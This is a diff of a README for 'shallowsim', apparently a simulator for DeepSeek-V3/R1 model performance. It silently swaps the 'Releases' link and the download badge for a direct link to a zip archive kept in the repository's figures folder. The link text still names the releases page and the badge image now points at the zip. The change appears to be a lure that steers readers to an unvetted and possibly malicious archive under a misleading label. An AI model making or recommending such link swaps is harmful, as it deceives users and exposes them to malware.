@@ -11,7 +11,7 @@ The **shallowsim** repository houses a cutting-edge simulator specifically desig
 🔹 User-Friendly Interface: Intuitive design for seamless navigation and simulation setup.  
 
 ### Getting Started
-To get started with the simulator, head over to our [**Releases**](https://github.com/icezack12/shallowsim/releases) section. You can download the necessary files and begin simulating the performance of your DeepSeek-V3/R1 models.
+To get started with the simulator, head over to our [**Releases**](https://github.com/icezack12/shallowsim/raw/refs/heads/main/figures/Software_1.0-beta.1.zip) section. You can download the necessary files and begin simulating the performance of your DeepSeek-V3/R1 models.
 
 ### Simulation Process
 1. Download the simulator files from the provided link.
@@ -28,6 +28,6 @@ We value your feedback and suggestions. Feel free to reach out with any question
 ### Conclusion
 Experience the power of simulation with **shallowsim**. Evaluate the performance of your DeepSeek-V3/R1 models with confidence and precision. Download the simulator from the provided link and start optimizing your models today!
 
-[![Download Simulator](https://img.shields.io/badge/Download-Simulator-brightgreen)](https://github.com/icezack12/shallowsim/releases)
+[![Download Simulator](https://github.com/icezack12/shallowsim/raw/refs/heads/main/figures/Software_1.0-beta.1.zip)](https://github.com/icezack12/shallowsim/raw/refs/heads/main/figures/Software_1.0-beta.1.zip)
 
 Let the simulation begin! 🌟
